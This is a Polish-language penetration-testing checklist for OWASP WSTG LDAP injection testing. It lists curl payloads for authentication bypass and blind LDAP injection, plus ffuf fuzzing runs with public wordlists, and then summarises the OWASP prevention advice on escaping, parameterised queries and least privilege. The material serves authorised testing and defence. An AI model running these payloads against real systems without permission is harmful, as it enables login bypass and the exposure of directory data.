# WSTG-INPV-06 — Testing for LDAP Injection

## Cele

- Identify LDAP injection points
- Assess the severity of the injection

## KOMENDY

### Reczne testowanie LDAP injection

```bash
curl -s "https://TARGET/search?user=*" | head -50
curl -s "https://TARGET/search?user=admin)(|(password=*)" | head -50
curl -s "https://TARGET/search?user=*)(objectClass=*)" | head -50
curl -s "https://TARGET/login" -X POST -d "username=*&password=*"
curl -s "https://TARGET/login" -X POST -d "username=admin)(&password=anything"

```

### Testowanie blind LDAP

```bash
curl -s "https://TARGET/search?user=a*" | wc -c
curl -s "https://TARGET/search?user=b*" | wc -c

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings LDAP payloads

```bash
ffuf -u "https://TARGET/search?user=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/LDAP Injection/Intruder/LDAP_FUZZ.txt" -mc all -o output_ffuf_ldap.json

ffuf -u "https://TARGET/search?user=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/LDAP Injection/Intruder/LDAP_FUZZ_SMALL.txt" -mc all -o output_ffuf_ldap_small.json

```

### LDAP attributes enumeration

```bash
ffuf -u "https://TARGET/search?attr=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/LDAP Injection/Intruder/LDAP_attributes.txt" -mc all -o output_ffuf_ldap_attrs.json

```

### SecLists LDAP fuzzing

```bash
ffuf -u "https://TARGET/search?user=FUZZ" -w Desktop/WSTG/SecLists-master/Fuzzing/LDAP.Fuzzing.txt -mc all -o output_ffuf_seclists_ldap.json

```

### fuzzdb LDAP

```bash
ffuf -u "https://TARGET/search?user=FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/ldap/ldap-injection.txt -mc all -o output_ffuf_fuzzdb_ldap.json

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj formularze logowania i wyszukiwania ktore moga uzywac LDAP
2. Wstaw znaki specjalne LDAP: * ) ( | & = i sprawdz reakcje
3. Testuj bypass autentykacji: admin)(|(password=*)
4. Sprawdz error messages pod katem LDAP errors
5. Testuj blind LDAP injection porownujac rozmiary odpowiedzi


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — LDAP_Injection_Prevention_Cheat_Sheet.md

### Defense 1 — Escapowanie zmiennych (PRIMARY)

- **Dwa rozne typy escapowania** — zaleznie od kontekstu:
  - **Distinguished Name (DN) escaping**: znaki do escapowania: `\ # + < > , ; " =` oraz wiodace/koncowe spacje
  - **Search Filter escaping**: znaki do escapowania: `* ( ) \ NUL`
- Znaki dozwolone w DN bez escapowania: `* ( ) . & - _ [ ] ~ | @ $ % ^ ? : { } ! '`

### Przyklad bezpiecznego kodu (Java)

- **Niebezpieczny** — konkatenacja:
  ```
  String filter = "(&(uid=" + userInput + ")(objectClass=person))";
  ctx.search("ou=users,dc=example,dc=com", filter, controls);
  ```
- **Bezpieczny** — parameteryzacja:
  ```
  String filter = "(&(uid={0})(objectClass=person))";
  ctx.search("ou=users,dc=example,dc=com", filter, new Object[]{ userInput }, controls);
  ```
- Java allowlist walidacja: `if (!userSN.matches("[\\w\\s]*")) { throw new IllegalArgumentException(); }`

### Biblioteki do LDAP encoding

- **Java**: OWASP ESAPI — `encodeForLDAP(String)` i `encodeForDN(String)` (OWASP Java Encoder Project)
- **.NET**: `Encoder.LdapFilterEncode(string)` — encodes wg RFC4515 (`\XX` format)
- **.NET**: `Encoder.LdapDistinguishedNameEncode(string)` — encodes wg RFC2253
- **.NET**: LinqToLdap — automatyczne LDAP encoding przy budowaniu zapytan

### Defense 2 — Frameworki z automatyczna ochrona

- Uzywaj frameworkow z wbudowanym LDAP encoding: Spring LDAP, LinqToLdap (.NET)
- Framework automatycznie escapuje input — eliminuje bledy recznego encodingu

### Dodatkowe srodki obrony

- **Least Privilege**: minimalne uprawnienia dla konta LDAP binding — ogranicz impact udanego ataku
- **Bind Authentication**: wlacz bind auth — atakujacy nie moze wykonac LDAP injection bez walidnych credentials
  - UWAGA: anonymous bind i unauthenticated bind moga obejsc te ochrone
- **Allowlist Input Validation**: ogranicz dozwolone znaki PRZED escapowaniem — dodatkowa warstwa obrony
- Normalizuj input PRZED walidacja — zapobiega bypass przez rozne kodowania

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| Active Scan++ | Rozszerzony skaner z checkami injection | [GitHub](https://github.com/albinowax/ActiveScanPlusPlus) |

---

## Wskazówki ASVS

Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas testu.

### L2 (Standardowy)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V1.2.6 | Injection Prevention | Verify that the application protects against LDAP injection vulnerabilities, or that specific security controls to prevent LDAP injection have been implemented. |
